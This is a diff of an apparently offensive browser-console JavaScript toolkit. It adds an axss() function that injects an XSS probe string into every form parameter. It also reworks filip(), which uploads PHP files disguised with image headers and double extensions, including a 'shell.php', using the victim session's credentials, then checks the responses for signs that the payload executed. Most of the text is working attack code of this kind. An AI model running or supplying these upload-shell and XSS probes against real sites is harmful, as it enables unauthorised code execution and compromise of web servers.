@@ -68,7 +68,17 @@ function collectFormInputs(formElement) {
 //const tags = collectTags(document);
 //console.log(tags);
 
-function brute() {
+function axss() {
+
+let inputs=document.getElementsByTagName("input");
+let payload="axss%27%22%3c"; let injection="";
+for (i=0;i<inputs.length;i++) {
+    injection+="&"+inputs[i].name+"="+payload;
+}
+injection=injection.replace("&","?");
+console.log("Visit & inspect: "+window.location.origin+window.location.pathname+injection);
+
+}function brute() {
     return "";
 }async function corscheck(num=0) {
     const input = prompt("Enter domains (newline separated):");
@@ -152,12 +162,12 @@ function filip(fileInput = null, formElement = null) {
     formElement = formElement || document.querySelector('form');
 
     if (!fileInput || !(fileInput instanceof HTMLInputElement)) {
-        console.warn("File input element not found.");
+        console.warn("File input not found");
         return;
     }
 
     if (!formElement || !(formElement instanceof HTMLFormElement)) {
-        console.warn("Form element not found.");
+        console.warn("Form element not found");
         return;
     }
 
@@ -172,7 +182,6 @@ function filip(fileInput = null, formElement = null) {
 
     const testFiles = [];
 
-    // Base and trick combos
     for (const f of baseFiles) {
         testFiles.push(
             { name: `${f.ext}.php`, mime: f.mime, header: f.header },
@@ -183,7 +192,6 @@ function filip(fileInput = null, formElement = null) {
         );
     }
 
-    // Pure PHP disguised as image
     testFiles.push({
         name: 'shell.php',
         mime: 'application/x-php',
@@ -200,32 +208,53 @@ function filip(fileInput = null, formElement = null) {
     };
 
     const runTests = async () => {
+        const action = formElement.getAttribute('action') || window.location.href;
+        const method = (formElement.getAttribute('method') || 'GET').toUpperCase();
+
         for (let file of testFiles) {
             const blob = generateBlob(file.header, payload, file.mime);
             const testFile = new File([blob], file.name, { type: file.mime });
 
-            const dataTransfer = new DataTransfer();
-            dataTransfer.items.add(testFile);
-            fileInput.files = dataTransfer.files;
+            const formData = new FormData();
 
-            console.log(`[*] Testing: ${file.name} (type: ${file.mime})`);
-            fileInput.dispatchEvent(new Event('change', { bubbles: true }));
-
-            formElement.dispatchEvent(new Event('submit', { bubbles: true }));
-            if (formElement.submit) {
-                try {
-                    formElement.submit();
-                } catch (e) {
-                    console.warn("Form.submit() failed. Maybe it's AJAX based.");
+            // Clone all inputs (hidden or not)
+            formElement.querySelectorAll('input').forEach(input => {
+                if (input.type === 'file') {
+                    formData.append(input.name || 'file', testFile);
+                } else if (input.name) {
+                    formData.append(input.name, input.value);
                 }
+            });
+
+            console.log(`[*] Uploading: ${file.name} (MIME: ${file.mime})`);
+
+            try {
+                const res = await fetch(action, {
+                    method: method,
+                    body: formData,
+                    credentials: 'include'
+                });
+
+                const text = await res.text();
+                console.log(`[+] Status: ${res.status} | Length: ${text.length}`);
+                if (/I am POC/.test(text)) {
+                    console.warn(`[!!!] Found payload execution in response! => ${file.name}`);
+                }
+
+            } catch (err) {
+                console.error(`[!] Fetch failed:`, err);
             }
 
-            await new Promise(res => setTimeout(res, 2000));
+            await new Promise(r => setTimeout(r, 1500));
         }
 
-        alert("✅ filip() test run complete! Check network panel.");
+        alert("✅ filip() completed — check console + network tab!");
     };
-
+// block any native submission
+formElement.addEventListener('submit', e => e.preventDefault());
+formElement.querySelectorAll('button, input[type="submit"]').forEach(btn => {
+    btn.addEventListener('click', e => e.preventDefault());
+});
     runTests();
 }
 function showhtml() {
